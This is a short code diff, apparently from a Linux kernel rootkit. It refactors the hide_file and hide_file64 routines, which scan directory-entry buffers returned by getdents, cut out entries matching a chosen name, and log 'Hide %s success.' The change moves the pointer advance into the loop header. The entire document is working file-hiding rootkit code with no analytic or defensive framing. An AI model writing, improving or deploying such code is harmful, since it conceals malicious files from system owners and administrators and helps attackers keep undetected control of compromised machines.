@@ -87,7 +87,9 @@ static long hide_file(char *f_name, struct linux_dirent *dirp, long count)
     long cur_addr, cur_reclen;
     unsigned long size, next_addr;
 
-    for (cur_addr = 0, dp = dirp; cur_addr < count; ) {
+    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
+        dp = (struct linux_dirent *)((unsigned long)dirp + cur_addr);
+        
         if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
             cur_reclen = dp->d_reclen;                              // Store the current length
             next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
@@ -98,9 +100,6 @@ static long hide_file(char *f_name, struct linux_dirent *dirp, long count)
             
             printk("Hide %s success.\n", dp->d_name);
         }
-        
-        cur_addr += dp->d_reclen;                                   // Current add the size to the next
-        dp = (struct linux_dirent *)((unsigned long)dirp + cur_addr);
     }
 
     return count;
@@ -119,7 +118,9 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
     long cur_addr, cur_reclen;
     unsigned long size, next_addr;
 
-    for (cur_addr = 0, dp = dirp; cur_addr < count; ) {
+    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
+        dp = (struct linux_dirent64 *)((unsigned long)dirp + cur_addr);
+        
         if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
             cur_reclen = dp->d_reclen;                              // Store the current length
             next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
@@ -130,9 +131,6 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
             
             printk("Hide %s success.\n", dp->d_name);
         }
-        
-        cur_addr += dp->d_reclen;                                   // Current add the size to the next
-        dp = (struct linux_dirent64 *)((unsigned long)dirp + cur_addr);
     }
 
     return count;
